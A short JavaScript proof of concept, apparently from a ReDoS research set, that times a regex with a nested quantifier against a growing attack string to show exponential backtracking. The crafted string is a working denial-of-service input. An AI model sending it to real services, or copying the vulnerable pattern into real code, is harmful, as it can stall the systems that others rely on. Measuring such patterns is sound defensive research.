/* 7374
 * [^(\&amp;)](\w*)+(\=)[\w\d ]*
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:" "+"1"*32+"@1 __NQ"
 */
var REGEX = /[^(\&amp;)](\w*)+(\=)[\w\d ]*/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = ' ' + '1'.repeat(i*1) + '@1 __NQ'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}